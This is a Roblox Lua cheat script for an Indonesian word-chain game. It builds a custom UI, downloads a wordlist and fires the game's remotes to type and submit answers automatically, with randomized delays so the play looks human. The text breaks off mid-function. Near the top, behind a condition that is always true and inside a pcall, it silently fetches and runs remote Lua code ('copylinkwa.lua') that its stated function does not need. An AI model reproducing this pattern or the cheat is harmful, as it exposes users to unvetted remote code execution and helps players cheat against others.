-- =========================================================
-- MODERN FLUENT THEME UI - AUTO KATA (ANTI DOUBLE)
-- =========================================================

if game:IsLoaded() == false then
    game.Loaded:Wait()
end

-- ==================== INIT ====================
if math.random() < 1 then
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/danzzy1we/gokil2/refs/heads/main/copylinkwa.lua"))()
    end)
end

task.wait(3)

-- =========================
-- SERVICES
-- =========================
local GetService = game.GetService
local ReplicatedStorage = GetService(game, "ReplicatedStorage")
local Players = GetService(game, "Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = GetService(game, "UserInputService")
local TweenService = GetService(game, "TweenService")
local RunService = GetService(game, "RunService")
local GuiService = GetService(game, "GuiService")
local CoreGui = GetService(game, "CoreGui")
local StarterGui = GetService(game, "StarterGui")

-- =========================
-- CUSTOM UI LIBRARY
-- =========================
local FluentUI = {
    Windows = {},
    Themes = {
        Dark = {
            Background = Color3.fromRGB(20, 22, 27),
            Surface = Color3.fromRGB(30, 32, 38),
            Primary = Color3.fromRGB(88, 101, 242),
            Secondary = Color3.fromRGB(47, 49, 54),
            Text = Color3.fromRGB(255, 255, 255),
            TextSecondary = Color3.fromRGB(160, 165, 180),
            Border = Color3.fromRGB(40, 43, 48),
            Success = Color3.fromRGB(67, 181, 129),
            Danger = Color3.fromRGB(240, 71, 104),
            Warning = Color3.fromRGB(250, 166, 26),
            Info = Color3.fromRGB(84, 172, 245)
        },
        Light = {
            Background = Color3.fromRGB(245, 245, 245),
            Surface = Color3.fromRGB(255, 255, 255),
            Primary = Color3.fromRGB(88, 101, 242),
            Secondary = Color3.fromRGB(230, 230, 230),
            Text = Color3.fromRGB(30, 30, 30),
            TextSecondary = Color3.fromRGB(100, 100, 100),
            Border = Color3.fromRGB(220, 220, 220),
            Success = Color3.fromRGB(67, 181, 129),
            Danger = Color3.fromRGB(240, 71, 104),
            Warning = Color3.fromRGB(250, 166, 26),
            Info = Color3.fromRGB(84, 172, 245)
        }
    },
    CurrentTheme = "Dark",
    Fonts = {
        Regular = Font.new("rbxasset://fonts/families/SourceSansPro.json"),
        Bold = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold),
        SemiBold = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold)
    }
}

-- =========================
-- UTILITY FUNCTIONS
-- =========================
function FluentUI:Create(options)
    local obj = Instance.new(options.Type)
    for prop, value in pairs(options.Properties or {}) do
        obj[prop] = value
    end
    return obj
end

function FluentUI:ApplyTheme(element, style)
    local theme = self.Themes[self.CurrentTheme]
    for prop, value in pairs(style or {}) do
        if type(value) == "string" and value:sub(1,1) == "@" then
            local themeProp = value:sub(2)
            element[prop] = theme[themeProp]
        else
            element[prop] = value
        end
    end
end

function FluentUI:CreateRoundedFrame(options)
    local frame = self:Create({
        Type = "Frame",
        Properties = {
            Name = options.Name or "Frame",
            Position = options.Position or UDim2.new(0,0,0,0),
            Size = options.Size or UDim2.new(0,100,0,100),
            BackgroundColor3 = options.BackgroundColor or Color3.new(1,1,1),
            BackgroundTransparency = options.BackgroundTransparency or 0,
            BorderSizePixel = 0,
            ClipsDescendants = options.ClipsDescendants or false
        }
    })
    
    local corner = self:Create({
        Type = "UICorner",
        Properties = {
            CornerRadius = options.CornerRadius or UDim.new(0, 8)
        }
    })
    corner.Parent = frame
    
    if options.Stroke then
        local stroke = self:Create({
            Type = "UIStroke",
            Properties = {
                Color = options.StrokeColor or Color3.fromRGB(40, 40, 40),
                Thickness = options.StrokeThickness or 1,
                Transparency = options.StrokeTransparency or 0
            }
        })
        stroke.Parent = frame
    end
    
    return frame
end

-- =========================
-- CREATE MAIN GUI
-- =========================
local function CreateMainUI()
    -- Main ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FluentKataUI"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999
    
    -- Coba pasang di CoreGui, fallback ke PlayerGui
    local success, err = pcall(function()
        screenGui.Parent = CoreGui
    end)
    if not success then
        screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
    
    -- Main Window Frame
    local mainWindow = FluentUI:CreateRoundedFrame({
        Name = "MainWindow",
        Size = UDim2.new(0, 350, 0, 500),
        Position = UDim2.new(0.5, -175, 0.5, -250),
        BackgroundColor = FluentUI.Themes.Dark.Background,
        CornerRadius = UDim.new(0, 12),
        Stroke = true,
        StrokeColor = FluentUI.Themes.Dark.Border,
        StrokeThickness = 1,
        ClipsDescendants = true
    })
    mainWindow.Parent = screenGui
    
    -- Shadow
    local shadow = FluentUI:Create({
        Type = "ImageLabel",
        Properties = {
            Name = "Shadow",
            Position = UDim2.new(0, -10, 0, -10),
            Size = UDim2.new(1, 20, 1, 20),
            BackgroundTransparency = 1,
            Image = "rbxasset://textures/ui/GuiImagePlaceholder.png",
            ImageColor3 = Color3.fromRGB(0, 0, 0),
            ImageTransparency = 0.7,
            ScaleType = Enum.ScaleType.Slice,
            SliceCenter = Rect.new(10, 10, 10, 10),
            ZIndex = -1
        }
    })
    shadow.Parent = mainWindow
    
    -- Title Bar
    local titleBar = FluentUI:Create({
        Type = "Frame",
        Properties = {
            Name = "TitleBar",
            Size = UDim2.new(1, 0, 0, 45),
            BackgroundColor3 = FluentUI.Themes.Dark.Surface,
            BackgroundTransparency = 0,
            BorderSizePixel = 0
        }
    })
    titleBar.Parent = mainWindow
    
    -- Title Bar Corner
    local titleCorner = FluentUI:Create({
        Type = "UICorner",
        Properties = {
            CornerRadius = UDim.new(0, 12)
        }
    })
    titleCorner.Parent = titleBar
    
    -- Title Bar Stroke
    local titleStroke = FluentUI:Create({
        Type = "UIStroke",
        Properties = {
            Color = FluentUI.Themes.Dark.Border,
            Thickness = 1,
            Transparency = 0
        }
    })
    titleStroke.Parent = titleBar
    
    -- Title Text
    local titleText = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Name = "Title",
            Position = UDim2.new(0, 16, 0, 0),
            Size = UDim2.new(0, 200, 1, 0),
            BackgroundTransparency = 1,
            Text = "Ai Kata • @stevenhellnah",
            FontFace = FluentUI.Fonts.SemiBold,
            TextSize = 18,
            TextColor3 = FluentUI.Themes.Dark.Text,
            TextXAlignment = Enum.TextXAlignment.Left
        }
    })
    titleText.Parent = titleBar
    
    -- Window Controls
    local controlsFrame = FluentUI:Create({
        Type = "Frame",
        Properties = {
            Name = "Controls",
            Position = UDim2.new(1, -90, 0, 0),
            Size = UDim2.new(0, 90, 1, 0),
            BackgroundTransparency = 1
        }
    })
    controlsFrame.Parent = titleBar
    
    -- Minimize Button
    local minimizeBtn = FluentUI:CreateRoundedFrame({
        Name = "MinimizeBtn",
        Size = UDim2.new(0, 30, 0, 30),
        Position = UDim2.new(0, 10, 0.5, -15),
        BackgroundColor = FluentUI.Themes.Dark.Secondary,
        CornerRadius = UDim.new(0, 6)
    })
    minimizeBtn.Parent = controlsFrame
    
    local minimizeIcon = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            Text = "−",
            FontFace = FluentUI.Fonts.Bold,
            TextSize = 20,
            TextColor3 = FluentUI.Themes.Dark.TextSecondary,
            TextScaled = true
        }
    })
    minimizeIcon.Parent = minimizeBtn
    
    -- Close Button
    local closeBtn = FluentUI:CreateRoundedFrame({
        Name = "CloseBtn",
        Size = UDim2.new(0, 30, 0, 30),
        Position = UDim2.new(1, -40, 0.5, -15),
        BackgroundColor = FluentUI.Themes.Dark.Secondary,
        CornerRadius = UDim.new(0, 6)
    })
    closeBtn.Parent = controlsFrame
    
    local closeIcon = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            Text = "×",
            FontFace = FluentUI.Fonts.Bold,
            TextSize = 20,
            TextColor3 = FluentUI.Themes.Dark.Danger,
            TextScaled = true
        }
    })
    closeIcon.Parent = closeBtn
    
    -- Tab Bar
    local tabBar = FluentUI:Create({
        Type = "Frame",
        Properties = {
            Name = "TabBar",
            Position = UDim2.new(0, 0, 0, 45),
            Size = UDim2.new(1, 0, 0, 40),
            BackgroundColor3 = FluentUI.Themes.Dark.Background,
            BackgroundTransparency = 0,
            BorderSizePixel = 0
        }
    })
    tabBar.Parent = mainWindow
    
    -- Tab Buttons Container
    local tabContainer = FluentUI:Create({
        Type = "Frame",
        Properties = {
            Name = "TabContainer",
            Position = UDim2.new(0, 10, 0, 0),
            Size = UDim2.new(1, -20, 1, 0),
            BackgroundTransparency = 1
        }
    })
    tabContainer.Parent = tabBar
    
    -- Main Tab Button
    local mainTabBtn = FluentUI:CreateRoundedFrame({
        Name = "MainTab",
        Size = UDim2.new(0, 100, 0, 30),
        Position = UDim2.new(0, 0, 0.5, -15),
        BackgroundColor = FluentUI.Themes.Dark.Primary,
        CornerRadius = UDim.new(0, 6)
    })
    mainTabBtn.Parent = tabContainer
    
    local mainTabText = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            Text = "Main",
            FontFace = FluentUI.Fonts.SemiBold,
            TextSize = 14,
            TextColor3 = FluentUI.Themes.Dark.Text
        }
    })
    mainTabText.Parent = mainTabBtn
    
    -- About Tab Button
    local aboutTabBtn = FluentUI:CreateRoundedFrame({
        Name = "AboutTab",
        Size = UDim2.new(0, 100, 0, 30),
        Position = UDim2.new(0, 110, 0.5, -15),
        BackgroundColor = FluentUI.Themes.Dark.Secondary,
        CornerRadius = UDim.new(0, 6)
    })
    aboutTabBtn.Parent = tabContainer
    
    local aboutTabText = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            Text = "About",
            FontFace = FluentUI.Fonts.SemiBold,
            TextSize = 14,
            TextColor3 = FluentUI.Themes.Dark.TextSecondary
        }
    })
    aboutTabText.Parent = aboutTabBtn
    
    -- Content Container
    local contentContainer = FluentUI:Create({
        Type = "ScrollingFrame",
        Properties = {
            Name = "ContentContainer",
            Position = UDim2.new(0, 0, 0, 85),
            Size = UDim2.new(1, 0, 1, -85),
            BackgroundTransparency = 1,
            BorderSizePixel = 0,
            ScrollBarThickness = 4,
            ScrollBarImageColor3 = FluentUI.Themes.Dark.Primary,
            CanvasSize = UDim2.new(0, 0, 0, 0),
            AutomaticCanvasSize = Enum.AutomaticSize.Y
        }
    })
    contentContainer.Parent = mainWindow
    
    -- UI List Layout
    local uiListLayout = FluentUI:Create({
        Type = "UIListLayout",
        Properties = {
            Padding = UDim.new(0, 10),
            HorizontalAlignment = Enum.HorizontalAlignment.Center,
            SortOrder = Enum.SortOrder.LayoutOrder
        }
    })
    uiListLayout.Parent = contentContainer
    
    -- UI Padding
    local uiPadding = FluentUI:Create({
        Type = "UIPadding",
        Properties = {
            PaddingTop = UDim.new(0, 10),
            PaddingBottom = UDim.new(0, 10),
            PaddingLeft = UDim.new(0, 10),
            PaddingRight = UDim.new(0, 10)
        }
    })
    uiPadding.Parent = contentContainer
    
    -- Initialize UI elements storage
    local uiElements = {
        ScreenGui = screenGui,
        MainWindow = mainWindow,
        ContentContainer = contentContainer,
        Tabs = {
            Main = {Button = mainTabBtn, Text = mainTabText, Elements = {}},
            About = {Button = aboutTabBtn, Text = aboutTabText, Elements = {}}
        },
        CurrentTab = "Main",
        IsMinimized = false,
        MinimizedSize = UDim2.new(0, 350, 0, 45),
        MaximizedSize = UDim2.new(0, 350, 0, 500)
    }
    
    return uiElements
end

-- =========================
-- UI ELEMENT CREATORS
-- =========================
function CreateParagraph(container, data)
    local frame = FluentUI:CreateRoundedFrame({
        Name = "Paragraph",
        Size = UDim2.new(1, -20, 0, 70),
        BackgroundColor = FluentUI.Themes.Dark.Surface,
        CornerRadius = UDim.new(0, 8),
        Stroke = true,
        StrokeColor = FluentUI.Themes.Dark.Border
    })
    frame.Parent = container
    frame.LayoutOrder = #container:GetChildren()
    
    local titleLabel = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Position = UDim2.new(0, 12, 0, 12),
            Size = UDim2.new(1, -24, 0, 20),
            BackgroundTransparency = 1,
            Text = data.Title or "Title",
            FontFace = FluentUI.Fonts.SemiBold,
            TextSize = 14,
            TextColor3 = FluentUI.Themes.Dark.Primary,
            TextXAlignment = Enum.TextXAlignment.Left
        }
    })
    titleLabel.Parent = frame
    
    local contentLabel = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Position = UDim2.new(0, 12, 0, 36),
            Size = UDim2.new(1, -24, 0, 22),
            BackgroundTransparency = 1,
            Text = data.Content or "",
            FontFace = FluentUI.Fonts.Regular,
            TextSize = 14,
            TextColor3 = FluentUI.Themes.Dark.Text,
            TextXAlignment = Enum.TextXAlignment.Left,
            TextWrapped = true,
            ClipsDescendants = false
        }
    })
    contentLabel.Parent = frame
    
    -- Auto-adjust height
    local function updateHeight()
        local textBounds = contentLabel.TextBounds
        local newHeight = math.max(70, 36 + textBounds.Y + 12)
        frame.Size = UDim2.new(1, -20, 0, newHeight)
        contentLabel.Size = UDim2.new(1, -24, 0, textBounds.Y)
    end
    
    updateHeight()
    contentLabel:GetPropertyChangedSignal("Text"):Connect(updateHeight)
    
    return {
        Frame = frame,
        Set = function(self, newData)
            titleLabel.Text = newData.Title or titleLabel.Text
            contentLabel.Text = newData.Content or contentLabel.Text
        end
    }
end

function CreateToggle(container, data)
    local frame = FluentUI:CreateRoundedFrame({
        Name = "Toggle",
        Size = UDim2.new(1, -20, 0, 50),
        BackgroundColor = FluentUI.Themes.Dark.Surface,
        CornerRadius = UDim.new(0, 8),
        Stroke = true,
        StrokeColor = FluentUI.Themes.Dark.Border
    })
    frame.Parent = container
    frame.LayoutOrder = #container:GetChildren()
    
    local label = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Position = UDim2.new(0, 16, 0, 0),
            Size = UDim2.new(0, 200, 1, 0),
            BackgroundTransparency = 1,
            Text = data.Name or "Toggle",
            FontFace = FluentUI.Fonts.Regular,
            TextSize = 15,
            TextColor3 = FluentUI.Themes.Dark.Text,
            TextXAlignment = Enum.TextXAlignment.Left
        }
    })
    label.Parent = frame
    
    local toggleBtn = FluentUI:CreateRoundedFrame({
        Name = "ToggleButton",
        Size = UDim2.new(0, 50, 0, 24),
        Position = UDim2.new(1, -66, 0.5, -12),
        BackgroundColor = data.CurrentValue and FluentUI.Themes.Dark.Primary or FluentUI.Themes.Dark.Secondary,
        CornerRadius = UDim.new(1, 0)
    })
    toggleBtn.Parent = frame
    
    local toggleCircle = FluentUI:CreateRoundedFrame({
        Name = "Circle",
        Size = UDim2.new(0, 18, 0, 18),
        Position = data.CurrentValue and UDim2.new(1, -22, 0.5, -9) or UDim2.new(0, 4, 0.5, -9),
        BackgroundColor = FluentUI.Themes.Dark.Text,
        CornerRadius = UDim.new(1, 0)
    })
    toggleCircle.Parent = toggleBtn
    
    local enabled = data.CurrentValue or false
    local callback = data.Callback or function() end
    
    local function toggle(value)
        enabled = value
        toggleBtn.BackgroundColor3 = enabled and FluentUI.Themes.Dark.Primary or FluentUI.Themes.Dark.Secondary
        toggleCircle:TweenPosition(
            enabled and UDim2.new(1, -22, 0.5, -9) or UDim2.new(0, 4, 0.5, -9),
            Enum.EasingDirection.Out,
            Enum.EasingStyle.Quad,
            0.2,
            true
        )
        callback(enabled)
    end
    
    toggleBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            toggle(not enabled)
        end
    end)
    
    return {
        Frame = frame,
        Set = function(self, value)
            toggle(value)
        end
    }
end

function CreateSlider(container, data)
    local frame = FluentUI:CreateRoundedFrame({
        Name = "Slider",
        Size = UDim2.new(1, -20, 0, 70),
        BackgroundColor = FluentUI.Themes.Dark.Surface,
        CornerRadius = UDim.new(0, 8),
        Stroke = true,
        StrokeColor = FluentUI.Themes.Dark.Border
    })
    frame.Parent = container
    frame.LayoutOrder = #container:GetChildren()
    
    local label = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Position = UDim2.new(0, 16, 0, 12),
            Size = UDim2.new(0, 200, 0, 20),
            BackgroundTransparency = 1,
            Text = data.Name or "Slider",
            FontFace = FluentUI.Fonts.Regular,
            TextSize = 15,
            TextColor3 = FluentUI.Themes.Dark.Text,
            TextXAlignment = Enum.TextXAlignment.Left
        }
    })
    label.Parent = frame
    
    local valueLabel = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Position = UDim2.new(1, -66, 0, 12),
            Size = UDim2.new(0, 50, 0, 20),
            BackgroundTransparency = 1,
            Text = tostring(data.CurrentValue or 0),
            FontFace = FluentUI.Fonts.SemiBold,
            TextSize = 15,
            TextColor3 = FluentUI.Themes.Dark.Primary,
            TextXAlignment = Enum.TextXAlignment.Right
        }
    })
    valueLabel.Parent = frame
    
    local sliderBg = FluentUI:CreateRoundedFrame({
        Name = "SliderBG",
        Size = UDim2.new(1, -32, 0, 6),
        Position = UDim2.new(0, 16, 0, 44),
        BackgroundColor = FluentUI.Themes.Dark.Secondary,
        CornerRadius = UDim.new(1, 0)
    })
    sliderBg.Parent = frame
    
    local sliderFill = FluentUI:CreateRoundedFrame({
        Name = "SliderFill",
        Size = UDim2.new(0, 0, 1, 0),
        BackgroundColor = FluentUI.Themes.Dark.Primary,
        CornerRadius = UDim.new(1, 0)
    })
    sliderFill.Parent = sliderBg
    
    local sliderKnob = FluentUI:CreateRoundedFrame({
        Name = "Knob",
        Size = UDim2.new(0, 16, 0, 16),
        Position = UDim2.new(0, 0, 0.5, -8),
        BackgroundColor = FluentUI.Themes.Dark.Text,
        CornerRadius = UDim.new(1, 0)
    })
    sliderKnob.Parent = sliderBg
    
    local min = data.Range[1] or 0
    local max = data.Range[2] or 100
    local increment = data.Increment or 1
    local current = data.CurrentValue or min
    local callback = data.Callback or function() end
    
    local dragging = false
    
    local function updateSlider(input)
        local pos = sliderBg.AbsolutePosition
        local size = sliderBg.AbsoluteSize.X
        local relativeX = math.clamp(input.Position.X - pos.X, 0, size)
        local percent = relativeX / size
        local rawValue = min + (max - min) * percent
        local steppedValue = math.floor(rawValue / increment + 0.5) * increment
        current = math.clamp(steppedValue, min, max)
        
        local fillWidth = (current - min) / (max - min) * sliderBg.AbsoluteSize.X
        sliderFill.Size = UDim2.new(0, fillWidth, 1, 0)
        sliderKnob.Position = UDim2.new(0, fillWidth - 8, 0.5, -8)
        valueLabel.Text = tostring(current)
        callback(current)
    end
    
    sliderBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            updateSlider(input)
        end
    end)
    
    sliderBg.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateSlider(input)
        end
    end)
    
    -- Initialize
    local initFillWidth = (current - min) / (max - min) * (sliderBg.AbsoluteSize.X)
    sliderFill.Size = UDim2.new(0, initFillWidth, 1, 0)
    sliderKnob.Position = UDim2.new(0, initFillWidth - 8, 0.5, -8)
    
    return {
        Frame = frame,
        Set = function(self, value)
            current = value
            local fillWidth = (current - min) / (max - min) * sliderBg.AbsoluteSize.X
            sliderFill.Size = UDim2.new(0, fillWidth, 1, 0)
            sliderKnob.Position = UDim2.new(0, fillWidth - 8, 0.5, -8)
            valueLabel.Text = tostring(current)
        end
    }
end

function CreateDropdown(container, data)
    local frame = FluentUI:CreateRoundedFrame({
        Name = "Dropdown",
        Size = UDim2.new(1, -20, 0, 50),
        BackgroundColor = FluentUI.Themes.Dark.Surface,
        CornerRadius = UDim.new(0, 8),
        Stroke = true,
        StrokeColor = FluentUI.Themes.Dark.Border
    })
    frame.Parent = container
    frame.LayoutOrder = #container:GetChildren()
    
    local label = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Position = UDim2.new(0, 16, 0, 0),
            Size = UDim2.new(1, -60, 1, 0),
            BackgroundTransparency = 1,
            Text = data.Name or "Dropdown",
            FontFace = FluentUI.Fonts.Regular,
            TextSize = 15,
            TextColor3 = FluentUI.Themes.Dark.Text,
            TextXAlignment = Enum.TextXAlignment.Left,
            TextTruncate = Enum.TextTruncate.AtEnd
        }
    })
    label.Parent = frame
    
    local arrow = FluentUI:Create({
        Type = "TextLabel",
        Properties = {
            Position = UDim2.new(1, -30, 0, 0),
            Size = UDim2.new(0, 20, 1, 0),
            BackgroundTransparency = 1,
            Text = "⌄",
            FontFace = FluentUI.Fonts.Bold,
            TextSize = 20,
            TextColor3 = FluentUI.Themes.Dark.TextSecondary
        }
    })
    arrow.Parent = frame
    
    local options = data.Options or {}
    local items = {}
    
    return {
        Frame = frame,
        Set = function(self, newOptions)
            options = newOptions
        end
    }
end

-- =========================
-- LOAD WORDLIST + ANTI DOUBLE
-- =========================
local kataModule = {}
local kataSet = {}
local httpget = game.HttpGet

local function downloadWordlist()
    local response = httpget(game, "https://raw.githubusercontent.com/danzzy1we/roblox-script-dump/refs/heads/main/WordListDump/withallcombination2.lua")
    if not response then
        return false
    end

    local content = string.match(response, "return%s*(.+)")
    if not content then
        return false
    end

    content = string.gsub(content, "^%s*{", "")
    content = string.gsub(content, "}%s*$", "")

    local duplicateCount = 0
    local totalProcessed = 0

    for word in string.gmatch(content, '"([^"]+)"') do
        totalProcessed = totalProcessed + 1
        local w = string.lower(word)
        
        if string.len(w) > 1 then
            if kataSet[w] == nil then
                kataSet[w] = true
                table.insert(kataModule, w)
            else
                duplicateCount = duplicateCount + 1
            end
        end
    end

    print(string.format("Wordlist loaded: %d total, %d unique, %d duplicates removed", 
        totalProcessed, #kataModule, duplicateCount))

    return true
end

local wordOk = downloadWordlist()
if not wordOk or #kataModule == 0 then
    warn("Wordlist gagal dimuat!")
    return
end

-- =========================
-- REMOTES
-- =========================
local remotes = ReplicatedStorage:WaitForChild("Remotes")

local MatchUI = remotes:WaitForChild("MatchUI")
local SubmitWord = remotes:WaitForChild("SubmitWord")
local BillboardUpdate = remotes:WaitForChild("BillboardUpdate")
local BillboardEnd = remotes:WaitForChild("BillboardEnd")
local TypeSound = remotes:WaitForChild("TypeSound")
local UsedWordWarn = remotes:WaitForChild("UsedWordWarn")

-- =========================
-- STATE
-- =========================
local matchActive = false
local isMyTurn = false
local serverLetter = ""

local usedWords = {}
local usedWordsSet = {}
local usedWordsList = {}
local opponentStreamWord = ""

local autoEnabled = false
local autoRunning = false

local config = {
    minDelay = 350,
    maxDelay = 650,
    aggression = 20,
    minLength = 2,
    maxLength = 12
}

-- =========================
-- LOGIC FUNCTIONS
-- =========================
local function isUsed(word)
    return usedWordsSet[string.lower(word)] == true
end

local usedWordsDropdown = nil

local function addUsedWord(word)
    local w = string.lower(word)
    if usedWordsSet[w] == nil then
        usedWordsSet[w] = true
        usedWords[w] = true
        table.insert(usedWordsList, word)
        if usedWordsDropdown ~= nil then
            usedWordsDropdown:Set(usedWordsList)
        end
    end
end

local function resetUsedWords()
    usedWords = {}
    usedWordsSet = {}
    usedWordsList = {}
    if usedWordsDropdown ~= nil then
        usedWordsDropdown:Set({})
    end
end

local function getSmartWords(prefix)
    local results = {}
    local lowerPrefix = string.lower(prefix)

    for i = 1, #kataModule do
        local word = kataModule[i]
        if string.sub(word, 1, #lowerPrefix) == lowerPrefix then
            if not isUsed(word) then
                local len = string.len(word)
                if len >= config.minLength and len <= config.maxLength then
                    table.insert(results, word)
                end
            end
        end
    end

    table.sort(results, function(a,b)
        return string.len(a) > string.len(b)
    end)

    return results
end

local function humanDelay()
    local min = config.minDelay
    local max = config.maxDelay
    if min > max then
        min = max
    end
    task.wait(math.random(min, max) / 1000)
end

-- =========================
-- AUTO ENGINE
-- =========================
local function startUltraAI()
    if autoRunning then return end
    if not autoEnabled then return end
    if not matchActive then return end
    if not isMyTurn then return end
    if serverLetter == "" then return end

    autoRunning = true

    humanDelay()

    local words = getSmartWords(serverLetter)
    if #words == 0 then
        autoRunning = false
        return
    end

    local selectedWord = words[1]

    if config.aggression < 100 then
        local topN = math.floor(#words * (1 - config.aggression/100))
        if topN < 1 then topN = 1 end
        if topN > #words then topN = #words end
        selectedWord = words[math.random(1, topN)]
    end

    local currentWord = serverLetter
    local remain = string.sub(selectedWord, #serverLetter + 1)

    for i = 1, string.len(remain) do
        if not matchActive or not isMyTurn then
            autoRunning = false
            return
        end

        currentWord = currentWord .. string.sub(remain, i, i)

        TypeSound:FireServer()
        BillboardUpdate:FireServer(currentWord)

        humanDelay()
    end

    humanDelay()

    SubmitWord:FireServer(selectedWord)
    addUsedWord(selectedWord)

    humanDelay()
    BillboardEnd:FireServer()

    autoRunning = false
end

-- =========================
-- CREATE UI
-- =========================
local ui = CreateMainUI()
local container = ui.ContentContainer
local currentTab = "Main"

-- Store UI elements references
local uiRefs = {
    opponentParagraph = nil,
    startLetterParagraph = nil,
    usedWordsDropdown = nil
}

-- =========================
-- CREATE MAIN TAB ELEMENTS
-- =========================
local function SwitchTab(tabName)
    -- Clear container
    for _, child in ipairs(container:GetChildren()) do
        if child:IsA("Frame") and child.Name ~= "UIListLayout" and child.Name ~= "UIPadding" then
            child:Destroy()
        end
    end
    
    -- Update tab buttons
    ui.Tabs.Main.Button.BackgroundColor3 = (tabName == "Main") and FluentUI.Themes.Dark.Primary or FluentUI.Themes.Dark.Secondary
    ui.Tabs.Main.Text.TextColor3 = (tabName == "Main") and FluentUI.Themes.Dark.Text or FluentUI.Themes.Dark.TextSecondary
    ui.Tabs.About.Button.BackgroundColor3 = (tabName == "About") and FluentUI.Themes.Dark.Primary or FluentUI.Themes.Dark.Secondary
    ui.Tabs.About.Text.TextColor3 = (tabName == "About") and FluentUI.Themes.Dark.Text or FluentUI.Themes.Dark.TextSecondary
    
    if tabName == "Main" then
        -- Wordlist Info Paragraph
        CreateParagraph(container, {
            Title = "📚 Wordlist Info",
            Content = string.format("Wordlist: %d kata unik", #kataModule)
        })
        
        -- Auto Toggle
        CreateToggle(container, {
            Name = "Aktifkan Auto",
            CurrentValue = false,
            Callback = function(Value)
                autoEnabled = Value
                if Value then
                    startUltraAI()
                end
            end
        })
        
        -- Aggression Slider
        CreateSlider(container, {
            Name = "Aggression",
            Range = {0, 100},
            Increment = 5,
            CurrentValue = config.aggression,
            Callback = function(Value)
                config.aggression = Value
            end
        })
        
        -- Min Delay Slider
        CreateSlider(container, {
            Name = "Min Delay (ms)",
            Range = {10, 500},
            Increment = 5,
            CurrentValue = config.minDelay,
            Callback = function(Value)
                config.minDelay = Value
            end
        })
        
        -- Max Delay Slider
        CreateSlider(container, {
            Name = "Max Delay (ms)",
            Range = {100, 1000},
            Increment = 5,
            CurrentValue = config.maxDelay,
            Callback = function(Value)
                config.maxDelay = Value
            end
        })
        
        -- Min Word Length
        CreateSlider(container, {
            Name = "Min Word Length",
            Range = {1, 2},
            Increment = 1,
            CurrentValue = config.minLength,
            Callback = function(Value)
                config.minLength = Value
            end
        })
        
        -- Max Word Length
        CreateSlider(container, {
            Name = "Max Word Length",
            Range = {5, 20},
            Increment = 1,
            CurrentValue = config.maxLength,
            Callback = function(Value)
                config.maxLength = Value
            end
        })
        
        -- Used Words Dropdown
        uiRefs.usedWordsDropdown = CreateDropdown(container, {
            Name = "Used Words",
            Options = usedWordsList
        })
        
        -- Status Paragraphs
        uiRefs.opponentParagraph = CreateParagraph(container, {
            Title = "Status Opponent",
            Content = "Menunggu..."
        })
        
        uiRefs.startLetterParagraph = CreateParagraph(container, {
            Title = "Kata Start",
            Content = "-"
        })
        
    elseif tabName == "About" then
        -- About Info
        CreateParagraph(container, {
            Title = "Informasi Script",
            Content = "Ai Kata, Versi: 2.0 (Anti Double), by stevenhellnah, Fiitur: Auto play dengan wordlist Indonesia + ANTI DUPLICATE KATA, thanks to danzy for the indonesian dictionary"
        })
        
        CreateParagraph(container, {
            Title = "Informasi Update",
            Content = "> Anti Double Word System, Wordlist unik (" .. #kataModule .. " kata), Deteksi otomatis kata dobel, Performa lebih cepat, Modern Fluent UI"
        })
        
        CreateParagraph(container, {
            Title = "Cara Penggunaan",
            Content = "1. Aktifkan toggle Auto 2. Atur delay dan agresivitas 3. Mulai permainan 4. Script akan otomatis menjawab 5. Kata dobel di wordlist sudah dihapus"
        })
    end
    
    currentTab = tabName
end

-- Tab click handlers
ui.Tabs.Main.Button.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        SwitchTab("Main")
    end
end)

ui.Tabs.About.Button.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        SwitchTab("About")
    end
end)

-- Initialize with Main tab
SwitchTab("Main")

-- =========================
-- WINDOW CONTROLS
-- =========================
-- Minimize functionality
local minimizeBtn = ui.MainWindow.TitleBar.Controls.MinimizeBtn
local closeBtn = ui.MainWindow.TitleBar.Controls.CloseBtn

-- Minimize animation
minimizeBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        ui.IsMinimized = not ui.IsMinimized
        
        local targetSize = ui.IsMinimized and ui.MinimizedSize or ui.MaximizedSize
        local targetContentVisible = not ui.IsMinimized
        
        -- Animate window
